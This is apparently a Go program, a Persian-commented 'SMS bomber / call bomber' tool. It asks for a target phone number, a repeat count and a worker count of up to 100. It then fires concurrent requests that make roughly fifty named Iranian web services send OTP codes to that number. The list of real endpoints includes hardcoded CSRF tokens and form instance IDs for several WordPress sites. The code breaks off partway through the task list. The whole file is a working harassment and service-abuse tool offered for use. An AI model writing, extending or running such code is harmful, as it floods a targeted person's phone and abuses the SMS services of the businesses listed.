package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done() // wg.Done() همچنان در انتهای تابع فراخوانی میشود

	const maxRetries = 3        // حداکثر تعداد تلاش مجدد
	const retryDelay = 2 * time.Second // فاصله زمانی بین تلاش‌های مجدد

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done(): // اگر Context لغو شده بود، از حلقه تلاش مجدد خارج شو
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0 // سیگنال لغو
			return
		default:
			// ادامه اجرای حلقه اگر Context لغو نشده باشد
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { // اگر آخرین تلاش هم ناموفق بود
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue // برو به تلاش بعدی
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { // اگر آخرین تلاش هم ناموفق بود
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue // برو به تلاش بعدی
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			// بررسی نوع خطا برای تلاش مجدد
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError // یا شاید کد خطای دیگری برای خطاهای شبکه
					return
				}
				time.Sleep(retryDelay)
				continue // برو به تلاش بعدی
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0 // سیگنال لغو
				return
			} else {
				// خطای غیرمنتظره یا غیرمرتبط با شبکه که نباید تلاش مجدد شود
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		// اگر درخواست موفق بود (بدون خطا در ارسال)، وضعیت را میفرستیم و خارج میشویم
		ch <- resp.StatusCode
		resp.Body.Close() // بستن بدنه پاسخ پس از استفاده
		return // درخواست موفق بود، نیازی به تلاش مجدد نیست
	}
}

func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done() // wg.Done() همچنان در انتهای تابع فراخوانی میشود

	const maxRetries = 3        // حداکثر تعداد تلاش مجدد
	const retryDelay = 3 * time.Second // فاصله زمانی بین تلاش‌های مجدد

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done(): // اگر Context لغو شده بود، از حلقه تلاش مجدد خارج شو
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0 // سیگنال لغو
			return
		default:
			// ادامه اجرای حلقه اگر Context لغو نشده باشد
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}

// تابع جدید برای ارسال درخواست‌های GET
func sendGETRequest(ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done() // wg.Done() همچنان در انتهای تابع فراخوانی میشود

	const maxRetries = 3        // حداکثر تعداد تلاش مجدد
	const retryDelay = 2 * time.Second // فاصله زمانی بین تلاش‌های مجدد

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done(): // اگر Context لغو شده بود، از حلقه تلاش مجدد خارج شو
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0 // سیگنال لغو
			return
		default:
			// ادامه اجرای حلقه اگر Context لغو نشده باشد
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil) // درخواست GET بدنه ندارد
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating GET request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			// بررسی نوع خطا برای تلاش مجدد
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError // یا شاید کد خطای دیگری برای خطاهای شبکه
					return
				}
				time.Sleep(retryDelay)
				continue // برو به تلاش بعدی
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0 // سیگنال لغو
				return
			} else {
				// خطای غیرمنتظره یا غیرمرتبط با شبکه که نباید تلاش مجدد شود
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		// اگر درخواست موفق بود (بدون خطا در ارسال)، وضعیت را میفرستیم و خارج میشویم
		ch <- resp.StatusCode
		resp.Body.Close() // بستن بدنه پاسخ پس از استفاده
		return // درخواست موفق بود، نیازی به تلاش مجدد نیست
	}
}


func main() {
	clearScreen()

	// ... (بخش چاپ لوگو - بدون تغییر)
	fmt.Print("\033[01;32m")
	fmt.Print(`
                                                               :-.
                                                            .:  =#-:-----:
                                                              **%@#%@@@#*+==:
                                                           :=*%@@@@@@@@@@@@@@%#*=:
                                                         -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.
                                                      . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:
                                                    .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.
                                                   =% .#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:
                                                  :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.
                                                  #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@..
                                                 .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
                                          =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
                                          +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
                                          =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-
                                          .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
                                          #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#
                                          -@@@@*:         -#@@@@@@#:  .       -#@@@%:
                                          *@@%#           -@@@@@@.          #@@@+
                                            .%@@# @monsmain +@@@@@@=  Sms Bomber #@@#
                                            :@@* =%@@@@@@%-  faster   *@@:
                                             #@@%         .*@@@@#%@@@%+.        %@@+
                                             %@@@+      -#@@@@@* :%@@@@@*-     *@@@*
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
                                           *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=
                                             #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*
                                              =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-
                                                .---@@@@@@@@@%@@@%%@@@@@@@@%:--.
                                                     #@@@@@@@@@@@@@@@@@@@@@@+
                                                      *@@@@@@@@@@@@@@@@@@@@+
                                                       +@@%*@@%@@@%%@%*@@%=
                                                         +%+ %%.+@%:-@* *%-
                                                          . %# .%# %+
                                                           :. %+ :.
                                                             -:
`)
	fmt.Print("\033[0m")
	// ... (پایان بخش چاپ لوگو)


	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	// --- بخش انتخاب سرعت ---
	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int // متغیر برای نگهداری تعداد کارگرها

	// تعیین تعداد کارگرها بر اساس انتخاب کاربر
	switch strings.ToLower(speedChoice) { // تبدیل ورودی به حروف کوچک برای مقایسه آسان‌تر
	case "fast":
		numWorkers = 100 // مثال: برای حالت سریع 100 کارگر
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":
		numWorkers = 30 // مثال: برای حالت متوسط 30 کارگر
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:
		numWorkers = 30 // پیش‌فرض به حالت متوسط
		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}
	// --- پایان بخش انتخاب سرعت ---

	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

	// محاسبه تعداد کل APIها که قرار است درخواست به آن‌ها ارسال شود
	// تعداد فعلی در کد اصلی + تعداد جدیدی که اضافه می‌کنیم
	// تعداد APIهای اصلی قابل استفاده (حدود 40) + APIهای جدیدی که اضافه میکنیم (حدود 24) = حدود 64
	// اندازه کانال وظایف و نتایج را بر اساس این تعداد کل تنظیم می‌کنیم.
	// repeatCount * تعداد کل APIها
	const totalAPIs = 40 + 24 // تعداد حدودی APIهای اصلی + جدید
	tasks := make(chan func(), repeatCount*totalAPIs)
	ch := make(chan int, repeatCount*totalAPIs)


	// ایجاد Goroutineهای کارگر با تعداد numWorkers تعیین شده
	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	// پر کردن کانال tasks با وظایف ارسال درخواست
	for i := 0; i < repeatCount; i++ {
		// ==================================================
		// APIهای اصلی موجود در کد
		// ==================================================

		// 2. itmall.ir (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "digits_check_mob")
			formData.Set("countrycode", "+98")
			formData.Set("mobileNo", phone)
			formData.Set("csrf", "e57d035242")
			formData.Set("login", "2")
			formData.Set("username", "")
			formData.Set("email", "")
			formData.Set("captcha", "")
			formData.Set("captcha_ses", "")
			formData.Set("json", "1")
			formData.Set("whatsapp", "0")
			sendFormRequest(ctx, "https://itmall.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}
		// 3. api.mootanroo.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.mootanroo.com/api/v3/auth/fadce78fbac84ba7887c9942ae460e0c/send-otp", map[string]interface{}{
				"PhoneNumber": phone, // استفاده از متغیر phone
			}, &wg, ch)
		}

		// 4. accounts.khanoumi.com (Form) - ساختار payload شبیه Form Data است
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("applicationId", "b92fdd0f-a44d-4fcc-a2db-6d955cce2f5e") // ممکن است نیاز به تولید دینامیک داشته باشد
			formData.Set("loginIdentifier", phone) // استفاده از متغیر phone
			formData.Set("loginSchemeName", "sms")
			sendFormRequest(ctx, "https://accounts.khanoumi.com/account/login/init", formData, &wg, ch)
		}

		// virgool.io (JSON) - این payload عجیب است، احتمالاً باید JSON باشد اما کلید مالفورم است
		// فرض میکنیم منظور {"method": "phone", "identifier": phone} بوده
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
				"method":     "phone",
				"identifier": phone,
			}, &wg, ch)
		}
		// virgool.io (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://virgool.io/api/v1.4/auth/user-existence", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}
		wg.Add(1) // virgool.io (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
				"identifier": phone,
			}, &wg, ch)
		}
		wg.Add(1) // digistyle.com (Form)
		tasks <- func() {
			formData := url.Values{}
			// کلید 'loginRegister%5Bemail_phone%5D' decode میشود به 'loginRegister[email_phone]'
			formData.Set("loginRegister[email_phone]", phone)
			sendFormRequest(ctx, "https://www.digistyle.com/users/login-register/", formData, &wg, ch)
		}
		wg.Add(1) // sandbox.sibbazar.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://sandbox.sibbazar.com/api/v1/user/generator-inv-token", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}
		wg.Add(1) // core.gapfilm.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://core.gapfilm.ir/api/v3.2/Account/Login", map[string]interface{}{
				"PhoneNo": phone,
			}, &wg, ch)
		}
		wg.Add(1) // api.pindo.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.pindo.ir/v1/user/login-register/", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // divar.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // shab.ir login-otp (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // shab.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{
				"mobile":       phone,
				"country_code": "+98",
			}, &wg, ch)
		}
		wg.Add(1) // Mobinnet (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": phone}, &wg, ch)
		}
		wg.Add(1) // api.ostadkr.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.ostadkr.com/login", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // digikalajet.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // iranicard.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.iranicard.ir/api/v1/register", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // alopeyk.com (JSON) - sms
		tasks <- func() {
			sendJSONRequest(ctx, "https://alopeyk.com/api/sms/send.php", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // alopeyk.com (JSON) - login
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // pinket.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}
		wg.Add(1) // otaghak.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}
		wg.Add(1) // banimode.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // gw.jabama.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://gw.jabama.com/api/v4/account/send-code", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // jabama.com (JSON) - taraazws
		tasks <- func() {
			sendJSONRequest(ctx, "https://taraazws.jabama.com/api/v4/account/send-code", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // torobpay.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.torobpay.com/user/v1/login/", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}
		wg.Add(1) // sheypoor.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.sheypoor.com/api/v10.0.0/auth/send", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}
		wg.Add(1) // miare.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}
		wg.Add(1) // pezeshket.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.pezeshket.com/core/v1/auth/requestCodeByMobile", map[string]interface{}{
				"mobileNumber": phone,
			}, &wg, ch)
		}
		wg.Add(1) // classino.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://app.classino.com/otp/v1/api/send_otp", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // snapp.taxi (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
				"cellphone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // api.snapp.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // snapp.market(JSON)
		tasks <- func() {
			sendJSONRequest(ctx, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
				"cellphone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // digikala.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}
		wg.Add(1) // ponisha.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // bitycle.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.bitycle.com/api/account/register", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // barghman (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://uiapi2.saapa.ir/api/otp/sendCode", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // komodaa.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.komodaa.com/api/v2.6/loginRC/request", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}
		wg.Add(1) // anargift.com auth (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://ssr.anargift.com/api/v1/auth", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // anargift.com (JSON) - send_code
		tasks <- func() {
			sendJSONRequest(ctx, "https://ssr.anargift.com/api/v1/auth/send_code", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // digitalsignup.snapp.ir (URL query) - این مورد با توجه به اطلاعات شما JSON نیست، باید GET باشد یا پارامترها در URL. چون فقط یک پارامتر اصلی دارد آن را فعلا با JSON و URL query میفرستیم اما ممکن است نیاز به تابع GET داشته باشد.
		tasks <- func() {
			sendJSONRequest(ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{
				"cellphone": phone, // احتمالا این فیلد در JSON نادیده گرفته میشود اما برای اطمینان میگذاریم
			}, &wg, ch)
		}
		wg.Add(1) // digitalsignup.snapp.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{
				"cellphone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // Snappfood (Form)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("cellphone", phone)
			sendFormRequest(ctx, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", formData, &wg, ch)
		}
		wg.Add(1) // khodro45.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
				"mobile": phone,
				"device_type": 2,
			}, &wg, ch)
		}
		wg.Add(1) // irantic.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // basalam.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://auth.basalam.com/captcha/otp-request", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // drnext.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // caropex.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://caropex.com/api/v1/user/login", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // tetherland.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://service.tetherland.com/api/v5/login-register", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // tandori.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.tandori.ir/client/users/login", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}

		// ==================================================
		// APIهای جدید اضافه شده بر اساس درخواست شما
		// ==================================================

		// 1. apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister (JSON POST)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister", map[string]interface{}{
				"mobile":                     phone,
				"confirmTerms":               true,
				"notRobot":                   false,
				"ValidationCodeCreateReason": 5,
				"OtpApp":                     0,
				"deviceTypeCode":             7,
				"IsAppOnly":                  false,
			}, &wg, ch)
		}

		// 2. livarfars.ir/wp-admin/admin-ajax.php (Form POST)
		// نیاز به Instance ID و Form ID - ممکن است پویا باشند
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("digt_countrycode", "+98")
			formData.Set("phone", phone)
			formData.Set("digits_process_register", "1")
			formData.Set("instance_id", "9db186c8061abadc35d6b9563c5e0f33") // ممکن است پویا باشد
			formData.Set("optional_data", "optional_data")
			formData.Set("action", "digits_forms_ajax")
			formData.Set("type", "register")
			formData.Set("dig_otp", "")
			formData.Set("digits", "1")
			formData.Set("digits_redirect_page", "//livarfars.ir/?page=2&redirect_to=https%3A%2F%2Flivarfars.ir%2F")
			formData.Set("digits_form", "58b9067254") // ممکن است پویا باشد
			formData.Set("_wp_http_referer", "/?login=true&page=2&redirect_to=https%3A%2F%2Flivarfars.ir%2F") // ممکن است پویا باشد
			sendFormRequest(ctx, "https://livarfars.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// 3. bitex24.com/api/v1/auth/sendSms2 (JSON POST)
		// نیاز به کپچا و Country Code - ممکن است ناموفق باشد
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://bitex24.com/api/v1/auth/sendSms2", map[string]interface{}{
				"mobile": phone,
				"countryCode": map[string]string{
					"code": "98",
					"img":  "Iran",
				},
				"captcha": "", // نیاز به حل کپچا دارد
			}, &wg, ch)
		}

		// 4. bigtoys.ir/wp-admin/admin-ajax.php (Form POST) - نوع sms_otp
		// نیاز به فیلدهای متعدد و ممکن است پویا باشند - نیاز به کپچا دارد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action_type", "phone")
			formData.Set("digt_countrycode", "+98")
			formData.Set("phone", phone)
			formData.Set("email", "")
			formData.Set("digits_reg_name", "placeholder") // فیلد placeholder
			formData.Set("digits_reg_password", "placeholder") // فیلد placeholder
			formData.Set("digits_process_register", "1")
			formData.Set("optional_email", "")
			formData.Set("is_digits_optional_data", "1")
			formData.Set("sms_otp", "")
			formData.Set("otp_step_1", "1")
			formData.Set("signup_otp_mode", "1")
			formData.Set("instance_id", "a1512cc9b4a4d1f6219e3e2392fb9222") // ممکن است پویا باشد
			formData.Set("optional_data", "email")
			formData.Set("action", "digits_forms_ajax")
			formData.Set("type", "register")
			formData.Set("dig_otp", "") // فیلد کپچا؟
			formData.Set("digits", "1")
			formData.Set("digits_redirect_page", "//www.bigtoys.ir/")
			formData.Set("digits_form", "3bed3c0f10") // ممکن است پویا باشد
			formData.Set("_wp_http_referer", "/") // ممکن است پویا باشد
			formData.Set("container", "digits_protected")
			formData.Set("sub_action", "sms_otp")
			sendFormRequest(ctx, "https://www.bigtoys.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// 5. bazidone.com/wp-admin/admin-ajax.php (Form POST) - نوع login/sms_otp
		// نیاز به فیلدهای متعدد و ممکن است پویا باشند - نیاز به کپچا دارد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("login_digt_countrycode", "+98")
			formData.Set("digits_phone", phone)
			formData.Set("action_type", "phone")
			formData.Set("g-recaptcha-response", "") // نیاز به حل کپچا دارد
			formData.Set("digits_reg_name", "placeholder") // فیلد placeholder
			formData.Set("digits_reg_lastname", "placeholder") // فیلد placeholder
			formData.Set("email", "placeholder") // فیلد placeholder
			formData.Set("digits_reg_password", "placeholder") // فیلد placeholder
			formData.Set("dig_captcha_ses", "placeholder") // ممکن است پویا باشد/نیاز به کپچا
			formData.Set("digits_reg_کپچا1744998945058", "") // فیلد با نام عجیب، ممکن است کپچا باشد
			formData.Set("digits_process_register", "1")
			formData.Set("rememberme", "1")
			formData.Set("digits", "1")
			formData.Set("instance_id", "34954781a28c46dfa36f4c1f8909f97b") // ممکن است پویا باشد
			formData.Set("action", "digits_forms_ajax")
			formData.Set("type", "login")
			formData.Set("digits_step_1_type", "")
			formData.Set("digits_step_1_value", "")
			formData.Set("digits_step_2_type", "")
			formData.Set("digits_step_2_value", "")
			formData.Set("digits_step_3_type", "")
			formData.Set("digits_step_3_value", "")
			formData.Set("digits_login_email_token", "")
			formData.Set("digits_redirect_page", "https://bazidone.com/my-account/") // ممکن است پویا باشد
			formData.Set("digits_form", "2180a35486") // ممکن است پویا باشد
			formData.Set("_wp_http_referer", "/?login=true&redirect_to=https%3A%2F%2Fbazidone.com%2Fmy-account%2F&page=1") // ممکن است پویا باشد
			formData.Set("show_force_title", "1")
			formData.Set("container", "digits_protected")
			formData.Set("sub_action", "sms_otp")
			sendFormRequest(ctx, "https://bazidone.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// 6. ashraafi.com/wp-admin/admin-ajax.php (Form POST) - نوع send_verification_code
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
